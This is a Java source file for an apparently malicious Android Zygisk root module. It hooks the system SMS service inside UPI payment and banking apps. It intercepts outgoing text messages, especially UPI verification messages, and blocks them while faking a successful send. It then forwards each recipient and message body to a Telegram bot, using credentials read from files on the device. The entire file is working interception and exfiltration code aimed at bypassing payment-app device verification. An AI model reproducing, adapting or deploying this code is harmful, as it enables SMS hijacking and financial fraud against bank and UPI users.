package com.hivirtus.zygisk;

import android.app.Application;
import android.app.PendingIntent;
import android.content.Context;
import android.os.IBinder;
import android.os.IInterface;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Exact Drive MenuLoader SMS path:
 * ServiceManager.getService("isms") → IBinder proxy →
 * queryLocalInterface → ISms dynamic proxy → sendText* intercept.
 */
public final class SmsTweaksHooks {
    private static final String TAG = "HivirtusSmsTweaks";
    private static final AtomicBoolean sStarted = new AtomicBoolean(false);
    private static final AtomicBoolean sHooked = new AtomicBoolean(false);
    private static volatile boolean sHookOutgoing = true;
    private static volatile String sProcess = "";

    private SmsTweaksHooks() {}

    public static void init(String process) {
        if (!sStarted.compareAndSet(false, true)) return;
        sProcess = process != null ? process : "";
        status("init_start|" + sProcess);
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    waitActivityThread();
                    applySmsHooks();
                    waitApplication();
                    // Re-clear after Application — SmsManager may re-cache
                    clearSmsManagerCache();
                    status("init_ready|" + sProcess);
                } catch (Throwable t) {
                    status("init_fail|" + t.getClass().getSimpleName() + "|" + safe(t.getMessage()));
                    Log.e(TAG, "init fail", t);
                }
            }
        }, "hivirtus-sms-tweaks").start();
    }

    public static void install(Context ctx) {
        init(ctx != null ? ctx.getPackageName() : sProcess);
    }

    public static void setHookOutgoing(boolean on) {
        sHookOutgoing = on;
        status("hook_outgoing|" + on);
    }

    private static Object currentActivityThread() {
        try {
            Class<?> at = Class.forName("android.app.ActivityThread");
            Method m = at.getDeclaredMethod("currentActivityThread");
            m.setAccessible(true);
            return m.invoke(null);
        } catch (Throwable t) {
            return null;
        }
    }

    private static Application currentApplication() {
        try {
            Class<?> at = Class.forName("android.app.ActivityThread");
            Method m = at.getDeclaredMethod("currentApplication");
            m.setAccessible(true);
            Object app = m.invoke(null);
            return app instanceof Application ? (Application) app : null;
        } catch (Throwable t) {
            return null;
        }
    }

    private static void waitActivityThread() {
        for (int i = 0; i < 200; i++) {
            if (currentActivityThread() != null) return;
            try { Thread.sleep(25); } catch (InterruptedException ignored) {}
        }
    }

    private static void waitApplication() {
        for (int i = 0; i < 200; i++) {
            if (currentApplication() != null) return;
            try { Thread.sleep(25); } catch (InterruptedException ignored) {}
        }
    }

    /** Drive MenuLoader.applySmsHooks — exact. */
    private static void applySmsHooks() {
        if (sHooked.get()) return;
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method getService = sm.getDeclaredMethod("getService", String.class);
            getService.setAccessible(true);
            final IBinder real = (IBinder) getService.invoke(null, "isms");
            if (real == null) {
                status("isms_binder_null");
                return;
            }
            if (Proxy.isProxyClass(real.getClass())) {
                sHooked.set(true);
                status("isms_already_proxied");
                return;
            }

            IBinder binderProxy = (IBinder) Proxy.newProxyInstance(
                    IBinder.class.getClassLoader(),
                    new Class[]{IBinder.class},
                    new InvocationHandler() {
                        @Override
                        public Object invoke(Object proxy, Method method, Object[] args)
                                throws Throwable {
                            if ("queryLocalInterface".equals(method.getName())) {
                                String desc = (args != null && args.length > 0 && args[0] != null)
                                        ? String.valueOf(args[0]) : "";
                                status("isms_qli|" + desc);
                                try {
                                    Class<?> iSms = Class.forName(
                                            "com.android.internal.telephony.ISms");
                                    Object local = createISmsProxy(real, iSms);
                                    if (local != null) return local;
                                } catch (Throwable t) {
                                    status("isms_qli_fail|" + t.getClass().getSimpleName());
                                }
                            }
                            try {
                                return method.invoke(real, args);
                            } catch (InvocationTargetException e) {
                                throw e.getTargetException();
                            }
                        }
                    });

            Field cacheF = sm.getDeclaredField("sCache");
            cacheF.setAccessible(true);
            @SuppressWarnings("unchecked")
            Map<String, Object> cache = (Map<String, Object>) cacheF.get(null);
            if (cache != null) {
                synchronized (cache) {
                    cache.put("isms", binderProxy);
                }
                status("isms_cache_put_ok|" + sProcess);
            } else {
                status("isms_cache_null");
            }

            clearSmsManagerCache();
            sHooked.set(true);
            status("isms_java_proxy_ok|" + sProcess);
            Log.i(TAG, "Drive-style isms IBinder→ISms proxy OK in " + sProcess);
        } catch (Throwable t) {
            status("isms_java_proxy_fail|" + t.getClass().getSimpleName() + "|" + safe(t.getMessage()));
            Log.e(TAG, "applySmsHooks fail", t);
        }
    }

    /** Drive MenuLoader.createISmsProxy — exact. */
    private static Object createISmsProxy(final IBinder realBinder, Class<?> iSmsCls) {
        try {
            Class<?> stub = Class.forName("com.android.internal.telephony.ISms$Stub");
            Method asInterface = stub.getDeclaredMethod("asInterface", IBinder.class);
            asInterface.setAccessible(true);
            final Object realISms = asInterface.invoke(null, realBinder);
            if (realISms == null) {
                status("isms_asinterface_null");
                return null;
            }
            return Proxy.newProxyInstance(
                    iSmsCls.getClassLoader(),
                    new Class[]{iSmsCls, IInterface.class},
                    new InvocationHandler() {
                        @Override
                        public Object invoke(Object proxy, Method method, Object[] args)
                                throws Throwable {
                            String name = method.getName();
                            if ((name.startsWith("sendText") || name.startsWith("sendMultipartText"))
                                    && sHookOutgoing) {
                                if (!shouldInterceptSend(args)) {
                                    try {
                                        return method.invoke(realISms, args);
                                    } catch (InvocationTargetException e) {
                                        throw e.getTargetException();
                                    }
                                }
                                status("isms_java_send_method|" + name);
                                handleSend(args);
                                return null; // void send* — no radio
                            }
                            try {
                                return method.invoke(realISms, args);
                            } catch (InvocationTargetException e) {
                                throw e.getTargetException();
                            }
                        }
                    });
        } catch (Throwable t) {
            status("isms_create_proxy_fail|" + t.getClass().getSimpleName());
            Log.e(TAG, "createISmsProxy fail", t);
            return null;
        }
    }

    private static boolean isMessagingProcess() {
        String p = sProcess != null ? sProcess : "";
        return p.contains("messaging") || p.contains("mms") || p.equals("com.android.mms")
                || p.contains("motorola.messaging");
    }

    private static boolean looksLikeUpiVerify(String body, String to) {
        if (body == null) body = "";
        if (to == null) to = "";
        String u = body.toUpperCase();
        if (u.contains("HEROAXIS") || u.contains("DO NOT COPY") || u.contains("USE UPI PIN")
                || u.contains("YESPROUPI") || u.contains("AXISUPI") || u.contains("PHONEPEUPI")) {
            return true;
        }
        if (body.length() >= 20 && (body.contains("?") || body.contains("*") || body.contains("&"))
                && (u.contains("UPI") || u.contains("PP-") || body.contains("pp-"))) {
            return true;
        }
        String d = to.replaceAll("[^0-9]", "");
        if ((d.equals("9920104300") || d.equals("56070") || d.equals("56161")
                || (d.length() >= 4 && d.length() <= 8)) && body.length() >= 12) {
            return true;
        }
        // UPI apps: intercept all outgoing
        return !isMessagingProcess();
    }

    private static boolean shouldInterceptSend(Object[] args) {
        String to = "";
        String body = "";
        if (args != null) {
            for (Object a : args) {
                if (!(a instanceof String)) continue;
                String s = (String) a;
                if (s.length() < 20 && !s.contains(" ")) to = s;
                else if (s.length() > 5) body = s;
            }
        }
        if (!isMessagingProcess()) return true; // UPI/Hero app — always intercept
        return looksLikeUpiVerify(body, to);
    }

    private static void handleSend(Object[] args) {
        String to = null;
        String body = null;
        PendingIntent singlePi = null;
        List<PendingIntent> multiPi = null;

        if (args != null) {
            for (Object a : args) {
                if (a == null) continue;
                if (a instanceof String) {
                    String s = (String) a;
                    // Drive: short no-space → dest; longer → body
                    if (s.length() < 20 && !s.contains(" ")) {
                        to = s;
                    } else if (s.length() > 5) {
                        body = s;
                    }
                } else if (a instanceof PendingIntent && singlePi == null) {
                    singlePi = (PendingIntent) a;
                } else if (a instanceof List) {
                    List<?> list = (List<?>) a;
                    if (!list.isEmpty() && list.get(0) instanceof PendingIntent) {
                        multiPi = new ArrayList<>();
                        for (Object o : list) {
                            if (o instanceof PendingIntent) multiPi.add((PendingIntent) o);
                        }
                    } else if (!list.isEmpty() && list.get(0) instanceof CharSequence && body == null) {
                        StringBuilder sb = new StringBuilder();
                        for (Object o : list) {
                            if (o != null) sb.append(o);
                        }
                        body = sb.toString();
                    }
                } else if (a instanceof PendingIntent[]) {
                    multiPi = new ArrayList<>();
                    for (PendingIntent pi : (PendingIntent[]) a) {
                        if (pi != null) multiPi.add(pi);
                    }
                }
            }
        }

        if (to == null) to = "";
        if (body == null) body = "";
        if (to.isEmpty()) to = "9920104300";
        status("isms_java_send|" + to + "|" + (body.length() > 40 ? body.substring(0, 40) : body));
        writeBlockedJson(to, body);
        // Prefer root service.sh forward (bank apps often block HTTPS) + best-effort direct
        queueServiceTelegram(to, body);
        if (!body.isEmpty()) sendTelegram(to, body);
        firePending(singlePi, multiPi);
    }

    private static void firePending(final PendingIntent single, final List<PendingIntent> multi) {
        if (single == null && (multi == null || multi.isEmpty())) {
            status("isms_no_pendingintent");
            return;
        }
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(120);
                    if (single != null) {
                        single.send(-1);
                    } else if (multi != null) {
                        for (PendingIntent pi : multi) {
                            if (pi != null) pi.send(-1);
                        }
                    }
                } catch (Throwable ignored) {}
            }
        }, "hivirtus-pi").start();
    }

    /** Drive clearSmsManagerCache + extra field names. */
    private static void clearSmsManagerCache() {
        try {
            Class<?> sms = Class.forName("android.telephony.SmsManager");
            String[] fields = {
                    "sSubIdToInstanceMap", "sSubInstances", "sInstance",
                    "mDefaultSmsManager", "sDefaultInstance"
            };
            for (String fn : fields) {
                try {
                    Field f = sms.getDeclaredField(fn);
                    f.setAccessible(true);
                    Object v = f.get(null);
                    if (v instanceof Map) {
                        ((Map<?, ?>) v).clear();
                    } else {
                        f.set(null, null);
                    }
                } catch (Throwable ignored) {}
            }
            status("smsmanager_cache_cleared");
        } catch (Throwable t) {
            status("smsmanager_cache_fail|" + t.getClass().getSimpleName());
        }
    }

    private static File[] writeTargets() {
        List<File> out = new ArrayList<>();
        out.add(new File("/data/local/tmp"));
        out.add(new File("/data/adb/modules/hivirtus_zygisk_mode"));
        try {
            Class<?> at = Class.forName("android.app.ActivityThread");
            Method m = at.getDeclaredMethod("currentApplication");
            m.setAccessible(true);
            Object app = m.invoke(null);
            if (app instanceof Context) {
                Context c = ((Context) app).getApplicationContext();
                out.add(c.getFilesDir());
                out.add(c.getCacheDir());
                File cc = new File(c.getCodeCacheDir(), "hivirtus");
                //noinspection ResultOfMethodCallIgnored
                cc.mkdirs();
                out.add(cc);
                File ext = c.getExternalFilesDir(null);
                if (ext != null) out.add(ext);
            }
        } catch (Throwable ignored) {}
        return out.toArray(new File[0]);
    }

    private static void writeAll(String name, String data) {
        byte[] bytes = data.getBytes(StandardCharsets.UTF_8);
        for (File dir : writeTargets()) {
            if (dir == null) continue;
            try {
                //noinspection ResultOfMethodCallIgnored
                dir.mkdirs();
                FileOutputStream fos = new FileOutputStream(new File(dir, name), false);
                fos.write(bytes);
                fos.close();
            } catch (Throwable ignored) {}
        }
    }

    private static void writeBlockedJson(String to, String body) {
        try {
            long ts = System.currentTimeMillis();
            String json = "{\"dest\":\"" + esc(to) + "\",\"to\":\"" + esc(to)
                    + "\",\"body\":\"" + esc(body)
                    + "\",\"pkg\":\"" + esc(sProcess) + "\",\"ts\":" + ts + "}\n";
            String flag = to + "\n" + body + "\n";
            // Names service.sh harvests
            writeAll("hivirtus_outgoing_blocked.json", json);
            writeAll("hivirtus_outgoing_blocked.flag", flag);
            writeAll("hivirtus_pending_verify.json", json);
            writeAll("hivirtus_last_outgoing.json", json);
            writeAll("hivirtus_blocked_outgoing.json", json); // legacy alias
            status("blocked_json_written|" + to + "|len=" + body.length());
        } catch (Throwable t) {
            status("blocked_json_fail|" + t.getClass().getSimpleName());
        }
    }

    /** Root service.sh picks this up — bank apps often block direct Telegram HTTPS. */
    private static void queueServiceTelegram(String to, String body) {
        try {
            writeAll("hivirtus_outgoing_blocked.flag", to + "\n" + body + "\n");
            // Do NOT set inproc_sent — that makes service.sh skip TG as duplicate
            for (File dir : writeTargets()) {
                try {
                    //noinspection ResultOfMethodCallIgnored
                    new File(dir, "hivirtus_tg_inproc_sent.flag").delete();
                } catch (Throwable ignored) {}
            }
            writeAll("hivirtus_java_tg_queue.flag", "1\n");
            status("tg_queued_service|" + to);
        } catch (Throwable ignored) {}
    }

    private static String readCredsToken() {
        String token = readFile("/data/local/tmp/hivirtus_tg_token.txt").trim();
        if (token.isEmpty()) {
            token = readFile("/data/adb/modules/hivirtus_zygisk_mode/tg_token.txt").trim();
        }
        if (token.isEmpty()) {
            String json = readFile("/data/local/tmp/hivirtus_telegram_credentials.json");
            if (json.isEmpty()) {
                json = readFile("/data/adb/modules/hivirtus_zygisk_mode/telegram_credentials.json");
            }
            token = jsonField(json, "telegram_bot_token");
        }
        return token;
    }

    private static String readCredsChat() {
        String chat = readFile("/data/local/tmp/hivirtus_tg_chat.txt").trim();
        if (chat.isEmpty()) {
            chat = readFile("/data/adb/modules/hivirtus_zygisk_mode/tg_chat.txt").trim();
        }
        if (chat.isEmpty()) {
            String json = readFile("/data/local/tmp/hivirtus_telegram_credentials.json");
            if (json.isEmpty()) {
                json = readFile("/data/adb/modules/hivirtus_zygisk_mode/telegram_credentials.json");
            }
            chat = jsonField(json, "telegram_chat_id");
        }
        return chat;
    }

    private static String jsonField(String json, String key) {
        if (json == null || json.isEmpty() || key == null) return "";
        String needle = "\"" + key + "\"";
        int i = json.indexOf(needle);
        if (i < 0) return "";
        int colon = json.indexOf(':', i + needle.length());
        if (colon < 0) return "";
        int q1 = json.indexOf('"', colon + 1);
        if (q1 < 0) return "";
        int q2 = json.indexOf('"', q1 + 1);
        if (q2 < 0) return "";
        return json.substring(q1 + 1, q2).trim();
    }

    private static void sendTelegram(String to, String body) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String token = readCredsToken();
                    String chat = readCredsChat();
                    if (token.isEmpty() || chat.isEmpty()) {
                        File cfg = new File(
                                "/data/adb/modules/hivirtus_zygisk_mode/config/telegram.env");
                        if (cfg.exists()) {
                            String[] lines = readFile(cfg.getAbsolutePath()).split("\n");
                            for (String line : lines) {
                                line = line.trim();
                                if (line.startsWith("BOT_TOKEN=")) token = line.substring(10).trim();
                                if (line.startsWith("CHAT_ID=")) chat = line.substring(8).trim();
                            }
                        }
                    }
                    if (token.isEmpty() || chat.isEmpty()) {
                        status("tg_skip_no_creds");
                        return;
                    }
                    String displayTo = to;
                    String digits = to.replaceAll("[^0-9]", "");
                    if (digits.length() == 10) displayTo = "+91" + digits;
                    else if (digits.length() == 12 && digits.startsWith("91"))
                        displayTo = "+" + digits;
                    String msg = "📱 SMS Intercepted Zygisk Mode Menu By @Hivirtus 🔥\n"
                            + "-----------------\n"
                            + "📞 To: " + displayTo + "\n"
                            + "💬 Message: " + body + "\n"
                            + "📋 One-tap copy:\n"
                            + "To: " + displayTo + "\n"
                            + "Message: " + body;
                    String url = "https://api.telegram.org/bot" + token + "/sendMessage";
                    String payload = "chat_id=" + URLEncoder.encode(chat, "UTF-8")
                            + "&text=" + URLEncoder.encode(msg, "UTF-8")
                            + "&disable_web_page_preview=true";
                    HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                    c.setConnectTimeout(8000);
                    c.setReadTimeout(8000);
                    c.setDoOutput(true);
                    c.setRequestMethod("POST");
                    c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                    c.getOutputStream().write(payload.getBytes(StandardCharsets.UTF_8));
                    int code = c.getResponseCode();
                    c.disconnect();
                    status("tg_sent|" + to + "|http=" + code);
                    writeAll("hivirtus_tg_last_response.txt", "java_http=" + code + "\n");
                } catch (Throwable t) {
                    status("tg_fail|" + t.getClass().getSimpleName());
                }
            }
        }, "hivirtus-tg").start();
    }

    private static String readFile(String path) {
        try {
            java.io.FileInputStream fis = new java.io.FileInputStream(path);
            byte[] buf = new byte[8192];
            int n = fis.read(buf);
            fis.close();
            return n > 0 ? new String(buf, 0, n, StandardCharsets.UTF_8) : "";
        } catch (Throwable t) {
            return "";
        }
    }

    private static void status(String line) {
        String row = System.currentTimeMillis() + "|" + line + "\n";
        try {
            FileWriter fw = new FileWriter("/data/local/tmp/hivirtus_sms_tweaks_status.txt", true);
            fw.write(row);
            fw.close();
        } catch (Throwable ignored) {}
        try {
            FileOutputStream fos = new FileOutputStream(
                    new File("/data/local/tmp/hivirtus_isms_trace.txt"), true);
            fos.write(("java|" + row).getBytes(StandardCharsets.UTF_8));
            fos.close();
        } catch (Throwable ignored) {}
        // Append into app code_cache (bank can't always write tmp)
        try {
            Class<?> at = Class.forName("android.app.ActivityThread");
            Method m = at.getDeclaredMethod("currentApplication");
            Object app = m.invoke(null);
            if (app instanceof Context) {
                File cc = new File(((Context) app).getCodeCacheDir(), "hivirtus");
                //noinspection ResultOfMethodCallIgnored
                cc.mkdirs();
                FileWriter fw = new FileWriter(new File(cc, "sms_tweaks_status.txt"), true);
                fw.write(row);
                fw.close();
            }
        } catch (Throwable ignored) {}
    }

    private static String esc(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "");
    }

    private static String escHtml(String s) {
        if (s == null) return "";
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
    }

    private static String safe(String s) {
        return s == null ? "" : s.replace("\n", " ").replace("|", "/");
    }
}
